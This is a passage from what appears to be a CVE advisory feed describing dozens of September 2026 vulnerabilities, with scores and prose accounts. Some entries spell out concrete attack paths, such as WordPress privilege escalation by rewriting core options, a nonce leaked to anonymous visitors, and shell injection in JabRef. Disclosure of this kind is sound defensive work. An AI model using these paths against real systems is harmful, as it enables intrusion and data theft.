| Published | 2026-09-18T08:16:59.403 |

The Printcart Web to Print Product Designer for WooCommerce plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 2.8.5 via the 'mockups' parameter. This makes it possible for unauthenticated attackers to read the contents of arbitrary files on the server, which can contain sensitive information. A valid nonce is obtainable by unauthenticated users via the companion nbd_check_use_logged_in nopriv AJAX endpoint, which freely mints and returns a nbdesigner-get-data nonce to any visitor; additionally, if the NBDESIGNER_ENABLE_NONCE constant is disabled, even this nonce gate is bypassed entirely.

### CVE-2026-18911

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-20` |
| Published | 2026-09-18T06:16:31.727 |

ManageEngine DataSecurity Plus versions before 6310 are vulnerable to an agent authentication bypass, allowing unenrolled agents to send requests without proper authentication.

### CVE-2026-85917

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-17T23:18:53.417 |

Server-side request forgery (ssrf) in Azure AI Foundry allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-53534

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-17T22:16:59.617 |

JabRef is a desktop application for managing BibTeX and BibLaTeX libraries. Prior to 6.0-alpha.6, when jabsrv or JabRef's built-in HTTP server is enabled, the GET /better-bibtex/cayw endpoint accepts an external command query parameter and CAYWQueryParams.getCommand() passes it through CAYWResource.getCitation() into PushToSublimeText.getCommandLine(). On Unix-like systems, PushToSublimeText combines this untrusted cite-command prefix and citation keys into a string executed through sh -c by ProcessBuilder without shell escaping. A client that can cause a localhost request with application=sublime can inject shell metacharacters and execute operating-system commands as the JabRef user when a valid Sublime Text command path is configured and the victim completes the CAYW selection dialog. The built-in server is disabled by default, so exploitation requires the victim to enable it or run jabsrv. This issue is fixed in version 6.0-alpha.6.

### CVE-2026-68537

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-835` |
| Published | 2026-09-17T21:17:19.870 |

`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that processes input supplied by many tenants. In versions prior to 0.19.0, a body-direct child whose CSS-resolved height greatly exceeds the page height was sliced into one fragment per page with no upper bound. This is fixed in version 0.19.0. A `MAX_PAGES` cap bounds the slice loop — halting it even for a `+inf` height — and non-finite layout heights are sanitized so they can no longer drive the loop. As a workaround, validate or constrain untrusted CSS (in particular `height` / `vh` on body-level elements) before passing HTML to fulgur.

### CVE-2026-68523

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-835` |
| Published | 2026-09-17T21:17:19.127 |

`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that processes input supplied by many tenants. In versions prior to 0.19.0, a body-direct child whose CSS-resolved height greatly exceeds the page height was sliced into one fragment per page with no upper bound. This is fixed in 0.19.0. A `MAX_PAGES` cap bounds the slice loop — halting it even
for a `+inf` height — and non-finite layout heights are sanitized so they can no longer drive the loop. As a workaround, validate or constrain untrusted CSS (in particular `height` / `vh` on body-level elements) before passing HTML to fulgur.

### CVE-2026-50277

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-09-17T21:17:14.243 |

dd-trace-cpp is the Datadog distributed tracing library for C++. Prior to 2.1.0, dd-trace-cpp parses incoming W3C baggage headers without enforcing DD_TRACE_BAGGAGE_MAX_ITEMS or DD_TRACE_BAGGAGE_MAX_BYTES on the extraction path, even though those limits are enforced during injection. A remote unauthenticated attacker can send a header containing many comma-separated key-value pairs or one very large value, causing per-request hash-map allocation and unbounded CPU and memory consumption. Baggage extraction is enabled by default in most affected tracers unless baggage is removed from DD_TRACE_PROPAGATION_STYLE or DD_TRACE_PROPAGATION_STYLE_EXTRACT, so affected internet-facing services can be denied service. This issue is fixed in version 2.1.0.

### CVE-2026-50275

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-09-17T21:17:14.073 |

The Datadog PHP Tracer provides application performance monitoring and distributed tracing for PHP. Prior to 1.19.2, ddtrace_deserialize_baggage in ext/distributed_tracing_headers.c parses incoming W3C baggage HTTP headers without enforcing DD_TRACE_BAGGAGE_MAX_ITEMS or DD_TRACE_BAGGAGE_MAX_BYTES. A remote unauthenticated client can send an arbitrarily large number of comma-separated key-value pairs or a single oversized value, causing the tracer to allocate hash-map entries and consume unbounded CPU and memory on each request. Baggage extraction is enabled by default in most affected deployments unless baggage is removed from DD_TRACE_PROPAGATION_STYLE or DD_TRACE_PROPAGATION_STYLE_EXTRACT. This issue is fixed in version 1.19.2.

### CVE-2026-54716

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-09-17T20:16:52.730 |

Valhalla is an open source routing engine and accompanying libraries for use with OpenStreetMap data. In 3.7.0 and earlier, a POST request to /sources_to_targets containing an exclude_polygons ring formed by three collinear points can cause unbounded memory growth in the worker. The zero-area geometry, rather than the other request options, triggers processing in src/loki/polygon_search.cc until the process is terminated by the out-of-memory killer. A single unauthenticated request can therefore stop a public-facing worker. Other endpoints that accept exclude_polygons, including /route, were not verified as affected. No fixed version is available as of this review.

### CVE-2026-50285

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770;CWE-1284` |
| Published | 2026-09-17T20:16:50.290 |

Pomerium is an identity and context-aware access proxy. Prior to 0.32.8, decodeQueryStringV2 in pkg/hpke/url.go performs zstd decompression of attacker-controlled data without an output-memory limit when DecryptURLValues processes HPKE V2 values for Stateless.Callback in internal/authenticateflow/stateless.go. In hosted or stateless authentication deployments, an unauthenticated attacker can obtain the receiver key from /.well-known/pomerium/hpke-public-key, provide a matching attacker-controlled sender key, and send a compressed payload to /.pomerium/callback that expands before validateSenderPublicKey rejects the sender. This can allocate hundreds of megabytes per request, exhaust proxy memory, crash or degrade the process, and block access to applications protected by the deployment. Stateful deployments are not affected because the stateful callback verifies its HMAC signature before decryption and decompression. This issue is fixed in version 0.32.8.

### CVE-2026-50125

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400` |
| Published | 2026-09-17T20:16:50.127 |

MKP is a Model Context Protocol server for Kubernetes. Prior to 0.4.1, cmd/server/main.go exposes the default HTTP endpoint and pkg/mcp/server.go registers the unauthenticated get_resource tool, which accepts attacker-controlled limitBytes and tailLines values for the pods logs subresource. buildPodLogOpts() in pkg/k8s/subresource.go parses those values as unbounded int64 parameters, and defaultGetPodLogs() copies the returned Kubernetes log stream through io.Copy into an in-memory bytes.Buffer without an application-side cap. A remote attacker who can reach the default port 8080 MCP endpoint and select a pod with sufficiently large accumulated logs can send one tools/call request that causes large allocations and additional response copies, while the request-frequency limiter does not constrain per-request volume. This can exhaust process memory, terminate the MKP server, and deny the MCP service; observed testing showed more than one GiB of RSS growth while handling a 128 MiB requested stream. This issue is fixed in version 0.4.1.

### CVE-2026-92230

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-401;CWE-772` |
| Published | 2026-09-17T19:17:06.897 |

Apache Karaf's XmlUtils cached XML parser/transformer factories in static ThreadLocal fields on long-lived container threads. Because a ThreadLocal value outlives the OSGi bundle that created it, repeated bundle or feature install, update, or refresh operations can leave successive bundle ClassLoader's pinned in memory and unreachable for garbage collection, leading to unbounded Metaspace growth and eventual denial of service of the Karaf instance.

### CVE-2026-86040

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-401;CWE-770` |
| Published | 2026-09-17T16:18:17.250 |

libp2p is a JavaScript implementation of the libp2p networking stack. Prior to 11.0.26, @libp2p/floodsub accepts unauthenticated RPC frames on /floodsub/1.0.0 through PeerStreams.attachInboundStream in packages/floodsub/src/peer-streams.ts without protobuf element limits, then processRpc and processRpcSubOpt in packages/floodsub/src/floodsub.ts synchronously process the subscriptions array without a per-frame cap. A single bounded-size frame can decode into millions of empty subscription entries that block the event loop, while hundreds of thousands of unique-topic SUBSCRIBE entries allocate PeerSet objects in this.topics that are not removed after peer removal or stop. Empty entries cause CPU exhaustion but do not grow this.topics; persistent memory growth requires unique topics. The subscription path bypasses message signature validation and the message-only processing queue, allowing a remote peer to cause sustained CPU denial of service, memory exhaustion, out-of-memory termination, and node unavailability. The issue is fixed in version 11.0.26.

### CVE-2026-86038

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| Weaknesses | `CWE-345;CWE-347` |
| Published | 2026-09-17T16:18:16.927 |

libp2p is a JavaScript implementation of the libp2p networking stack. From 15.0.0 until 16.0.5, @libp2p/gossipsub uses the default StrictSign policy in packages/gossipsub/src/utils/buildRawMessage.ts, where validateToRawMessage verifies a signature with attacker-controlled msg.key but skips binding that key to msg.from when the claimed author is an RSA peer ID that does not inline a public key. An unauthenticated attacker can place a victim RSA peer ID in msg.from, sign the message with the attacker's private key, and supply the attacker's public key in msg.key, causing the message to be accepted and propagated as authored by the victim. Applications that trust message.from for validators, authorization, accounting, moderation, reputation, or audit logging can process attacker-controlled data under false origin attribution. The issue is fixed in version 16.0.5.

### CVE-2026-85721

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-409` |
| Published | 2026-09-17T16:18:16.430 |

The AsyncHttpClient (AHC) library allows Java applications to easily execute HTTP requests and asynchronously process HTTP responses. From 2.0.0 until 2.16.1 and 3.0.12, automatic response decompression on the HTTP/1.1 path uses ChannelManager.newHttpContentDecompressor() to install Http1ContentDecompressor without a cumulative output-size limit. A hostile or compromised server, or an attacker who can alter a response in transit, can send a small gzip, deflate, or snappy response that expands across chunks until the client exhausts its heap and raises OutOfMemoryError; brotli and zstd are also affected when their optional codecs are present. In versions 3.0.8 through 3.0.10, the HTTP/2 decompressor is also unbounded, so switching protocols does not mitigate the issue on those releases. A limit applied to each decode call is insufficient because the response can be delivered as many small chunks, so the fixed implementation tracks total decompressed bytes for the whole response. This issue is fixed in versions 2.16.1 and 3.0.12.

### CVE-2026-85719

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-319;CWE-522` |
| Published | 2026-09-17T16:18:16.273 |

The AsyncHttpClient (AHC) library allows Java applications to easily execute HTTP requests and asynchronously process HTTP responses. From 2.1.0 until 2.16.1 and 3.0.12, requests using an authenticated SOCKS proxy can expose the proxy's credentials to the origin because NettyRequestFactory and NettyRequestSender attach Proxy-Authorization without confirming that the request is being sent to an HTTP proxy. With preemptive proxy authentication, the header is attached to a plaintext HTTP request, exposing credentials such as directly reversible Basic credentials to the origin. With the default non-preemptive flow, a hostile origin can return a 407 response and ProxyUnauthorized407Interceptor sends the proxy credentials through the existing SOCKS tunnel, including NTLM, Kerberos, and SPNEGO credentials. Releases before 2.1.0 lack SOCKS proxy support. This issue is fixed in versions 2.16.1 and 3.0.12.

### CVE-2026-85715

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-789;CWE-835` |
| Published | 2026-09-17T16:18:15.790 |

ExifReader is a JavaScript Exif information parser. Prior to 4.41.1, ExifReader parses attacker-controlled HEIC or AVIF ISO-BMFF files in getItems() within src/image-header-iso-bmff-iloc.js and trusts iloc itemCount and extentCount values while allocating an extent object for every nested-loop iteration. When offsetSize, lengthSize, baseOffsetSize, and indexSize are zero, the extent fields consume no input bytes and the buffer offset does not advance, but the parser can still allocate up to itemCount multiplied by extentCount objects without an allocation budget. A small malicious iloc box can therefore cause hundreds of megabytes of heap growth or exhaust system memory, terminating a Node.js process and denying service to web, desktop, or mobile applications that parse untrusted images. The zero field widths are valid ISO-BMFF values indicating absent fields, so the vulnerable parser must bound work rather than relying on offset advancement. The issue is fixed in version 4.41.1.

### CVE-2026-81516

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-755` |
| Published | 2026-09-17T16:17:46.930 |

Steeltoe is an open source project that provides a collection of libraries that helps users build cloud-native applications. From 4.0.0 until 4.3.0, ConsulDiscoveryClient constructs ConsulServiceInstance objects by parsing each registration's secure metadata with a strict Boolean conversion. A principal that can register a Consul service can supply a secure value other than true or false, causing the exception from one instance to abort construction of the entire instance list and make the targeted service undiscoverable. When GetAllInstancesAsync enumerates all services, one malformed instance can abort enumeration across every service. The outage persists until the offending registration is removed. This issue is fixed in version 4.3.0.

### CVE-2026-81515

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-755` |
| Published | 2026-09-17T16:17:46.780 |

Steeltoe is an open source project that provides a collection of libraries that helps users build cloud-native applications. From 4.0.0 until 4.3.0, EurekaDiscoveryClient deserializes the registry response as one unit, and an unrecognized actionType or status, a non-Boolean isCoordinatingDiscoveryServer, or a nonnumeric timestamp can abort the entire response. A principal that can register or update an instance can cause all connected Steeltoe clients to receive an empty or stale instance list until the malformed registration is removed. The JsonInstanceInfoConverter, BoolStringJsonConverter, and LongStringJsonConverter parsing paths are affected. This issue is distinct from the earlier DataCenterInfo.name parsing vulnerability. This issue is fixed in version 4.3.0.

### CVE-2026-87742

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-09-17T15:16:56.137 |

A flaw was found in quarkus-websockets-next. This vulnerability allows a remote attacker to cause a Denial of Service (DoS) by streaming messages over a single connection faster than the application can process them. Due to unbounded message buffering and a lack of read backpressure, this rapidly exhausts heap space, leading to a java.lang.OutOfMemoryError that crashes the Java Virtual Machine (JVM).

### CVE-2026-63460

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-1333` |
| Published | 2026-09-17T15:16:49.447 |

Vendure is an open-source headless commerce platform. Prior to 3.6.5, the public Shop GraphQL API allows an unauthenticated caller to supply a catastrophically backtracking pattern through StringOperators.regex. packages/core/src/service/helpers/list-query-builder/parse-filter-params.ts passes the raw pattern to the REGEXP implementation registered by packages/core/src/service/helpers/list-query-builder/list-query-builder.ts, and better-sqlite3 and sqljs evaluate it synchronously in the Node.js event loop. ShopProductsResolver.products is publicly reachable, so one nested-quantifier pattern can block request processing and make the storefront and admin API unavailable, while repeated requests can sustain denial of service. PostgreSQL and MySQL or MariaDB deployments do not execute this regular expression in the Node.js event loop. This issue is fixed in version 3.6.5.

### CVE-2026-89058

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2026-09-18T08:17:01.653 |

A flaw was found in RESTEasy's CorsFilter, which, when configured to allow all origins ("*"), reflects the request's Origin header back in the Access-Control-Allow-Origin response together with Access-Control-Allow-Credentials: true. This permissive cross-origin policy allows a malicious website to make credentialed cross-origin requests and read authenticated responses from a victim's session, resulting in a loss of confidentiality.

### CVE-2026-78501

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-77;CWE-923` |
| Published | 2026-09-17T23:18:45.770 |

Improper neutralization of special elements used in a command ('command injection') in Microsoft 365 Copilot's Business Chat allows an unauthorized attacker to disclose information over a network.

### CVE-2026-86688

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-384` |
| Published | 2026-09-17T22:17:04.180 |

Session Fixation vulnerability in team-alembic ash_authentication allows an attacker who can plant a session identifier in a victim's browser to hold an authenticated session once that victim signs in.

AshAuthentication.Plug.Helpers.store_in_session/2 writes the authenticated subject into the existing session with Plug.Conn.put_session/3 and never calls Plug.Conn.configure_session(renew: true), so the identifier the visitor arrived with carries into their authenticated session. Every authentication event reaches this one function: the default success/4 injected by AshAuthentication.Phoenix.Controller.__using__/1, the AuthController emitted by mix ash_authentication_phoenix.install, and remember-me auto-login. AshAuthentication.Phoenix.Plug.store_in_session/2 is a defdelegate to it. Logout does not close the window either, because clear_session/2 ends with Plug.Conn.clear_session/1, which clears session contents but leaves the identifier intact, so a planted identifier survives a logout-then-login cycle.

This issue affects ash_authentication: from 0.2.0 before 4.15.0 and from 5.0.0-rc.0 before 5.0.0-rc.14.

### CVE-2026-90997

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-294` |
| Published | 2026-09-17T19:17:06.740 |

A flaw was found in Keycloak. When deployed in stateless mode with MySQL or MariaDB, a mismatch in row-count semantics between the database driver and Keycloak's application logic allows an attacker to bypass replay protection. This vulnerability enables an attacker who intercepts single-use security artifacts, such as JWT client assertions, DPoP proofs, or one-time password (TOTP) codes, to replay them. Successful exploitation grants unauthorized access to the token endpoint or login flow.

### CVE-2026-81446

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-17T15:16:52.573 |

Dell OpenManage Server Administrator, versions prior to 11.1.0.3, contains a Server-Side Request Forgery (SSRF) vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to Server-side request forgery.

### CVE-2026-54634

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `CWE-787;CWE-908` |
| Published | 2026-09-17T22:17:01.840 |

Hamlib is a ham radio control library for radios, rotators, and amplifiers. Prior to 4.7.2, the unauthenticated rigctld send_raw command on TCP port 4532 reaches rigctl_send_raw() in tests/rigctl_parse.c, which writes a NUL byte at buf[buf_len + 1] outside its 200-byte stack buffer, and rig_send_raw() in src/rig.c, which copies reply_len - 1 bytes instead of the actual nbytes received. A remote client can send the CR terminator with a short payload to trigger both flaws in one command under the default no-password configuration. The out-of-bounds write can crash the daemon or corrupt adjacent stack memory, while the oversized copy can return up to 198 bytes of uninitialized stack data to the client. This issue is fixed in version 4.7.2.

### CVE-2026-53554

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:H/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-17T22:16:59.770 |

SQLBot is an intelligent Text-to-SQL system based on large language models and RAG. Prior to 1.9.0, the POST /api/v1/datasource/parseExcel endpoint in backend/apps/datasource/api/datasource.py uses attacker-controlled multipart filename data when selecting where uploaded content is stored, writes the content before spreadsheet parsing and validation finish, and can transform a double-extension filename into a Python source file. An attacker able to submit a crafted multipart upload can use these behaviors to place attacker-controlled content in /opt/sqlbot/app/alembic/versions/ even when a spreadsheet parsing failure after the file write causes the endpoint to return an error. The planted file remains on disk, and subsequent SQLBot startup or migration processing causes Alembic to import the module and execute its module-level statements in the SQLBot application runtime. This issue is fixed in version 1.9.0.

### CVE-2026-76154

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-17T21:17:37.760 |

A stored cross-site scripting vulnerability in the Geomap panel's MapLibre base layer allows a user with the Editor role to execute arbitrary JavaScript in another user's session by hosting a malicious style configuration, enabling escalation to Org Admin.

### CVE-2026-80356

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2026-09-17T15:16:51.973 |

Dell OpenManage Server Administrator, versions prior to 11.1.0.3, contains an Exposure of Sensitive Information to an Unauthorized Actor vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to Information exposure.

### CVE-2026-93591

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T14:19:10.097 |

SiYuan versions before 3.8.3 contain an SQL injection vulnerability in the graph.go query2Stmt function where tag values are concatenated raw into SQL string literals without escaping single quotes. A publish-mode reader or anonymous visitor can inject SQL via inline HTML span tags in the getGraph endpoint to execute arbitrary queries on the read-write database and exfiltrate private data across notebooks.

### CVE-2026-87915

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T10:17:07.717 |

The Popup Maker – Boost Sales, Conversions, Optins, Subscribers with the Ultimate WP Popup Builder plugin for WordPress is vulnerable to Stored Cross-Site Scripting via values[Name] Parameter in all versions up to, and including, 1.24.0 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. The wp_kses sanitization applied on output is insufficient in this context because HTML entities within allowed attribute values survive normalization intact and are later evaluated by the jQuery(link.attr('href')) sink in wp-admin/js/common.js when a contextual help tab anchor is clicked.

### CVE-2026-18405

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T10:17:06.310 |

The Jeg Kit for Elementor – Powerful Addons for Elementor, Widgets & Templates for WordPress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via Comment Content in all versions up to, and including, 3.2.16 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Successful exploitation requires that the targeted post also renders a legitimate Jeg Kit Countdown widget, which causes the countdown frontend script to be enqueued and to initialize on any matching DOM element — including forged widget markup stored in comments.

### CVE-2026-83561

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T09:16:42.357 |

The Complianz GDPR/CCPA Cookie Consent Banner plugin for WordPress is vulnerable to Stored Cross-Site Scripting via Comment Content via Elementor Cookie Blocker Regex in all versions up to, and including, 7.5.4 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Successful exploitation requires an administrator to approve the attacker's comment, and the site must have both the Elementor plugin installed and Complianz configured with the Twitter or Facebook cookie/script blocker enabled.

### CVE-2026-92619

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-09-18T07:16:51.997 |

The Booking Calendar plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 11.8.2 via the `wpbc_ajax_option_save` AJAX action. The vulnerability exists because the `handle_ajax_save()` function applies per-option safeguards only to names explicitly registered via `register_option_policy()`, causing `get_option_policy()` to return an empty policy — bypassing all can_save, force_mode, and allowed_keys checks — for any unregistered option name, including core WordPress options, while an attacker-controlled `data_name` parameter passes through `sanitize_key()` and is written directly to `update_option()` without restriction. This makes it possible for authenticated attackers with Editor-level access and above to escalate their privileges to Administrator by writing core WordPress options such as `default_role=administrator` and `users_can_register=1`, then self-registering a new Administrator account. The nonce check does not meaningfully restrict this attack, as both the nonce value and nonce action are attacker-supplied POST parameters, and a valid nonce is trivially obtainable via `admin-ajax.php?action=rest-nonce`.

### CVE-2026-81810

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-09-18T06:16:39.193 |

The All-in-One WP Migration and Backup WordPress plugin before 7.111 does not perform any capability check on several of its AJAX actions, gating them only on an installation-wide secret which it discloses to any user permitted to export the site, allowing such a user to import an arbitrary site archive and gain administrator access. Exploitation requires an administrator to have granted the export capability to a role that does not hold the All-in-One WP Migration and Backup WordPress plugin before 7.111's own import capability, which is not a default configuration.

### CVE-2026-54647

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T22:17:02.703 |

CubeCart is an ecommerce software solution. Prior to 6.7.5, admin/sources/settings.index.inc.php directly concatenates the administrator-controlled download_expire POST parameter into a raw UPDATE statement for CubeCart_downloads without numeric validation. An authenticated administrator can supply a comma-delimited value that changes the SET clause because HTML sanitization does not neutralize SQL syntax, allowing manipulation of database columns and potentially other data within the application's database privileges. This issue is fixed in version 6.7.5.

### CVE-2026-54646

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T22:17:02.570 |

CubeCart is an ecommerce software solution. Prior to 6.7.5, admin/sources/maintenance.index.inc.php places administrator-controlled tablename values into ALTER TABLE, CHECK TABLE, and ANALYZE TABLE statements without validating the identifiers or escaping embedded backticks. An authenticated administrator can terminate the quoted identifier with a closing backtick and introduce attacker-controlled structural SQL, potentially compromising database confidentiality, integrity, and availability within the application's database privileges. This issue is fixed in version 6.7.5.

### CVE-2026-52727

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-321` |
| Published | 2026-09-17T19:16:49.530 |

lxc-ci contains continuous integration and image-build scripts for LXC. Prior to the 2026-05-28 Arch Linux image publication, images built from images/archlinux.yaml retain the same pacman local-signing private key in /etc/pacman.d/gnupg and redistribute it to every container or virtual machine created from that image. An attacker who controls an HTTP package mirror or can intercept mirror traffic can use the shared pacman signing private key to sign modified packages that affected clients accept as trusted. Installing those packages permits arbitrary code execution as root on the client system. This issue is fixed in Arch Linux images published on or after 2026-05-28.

### CVE-2026-81445

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
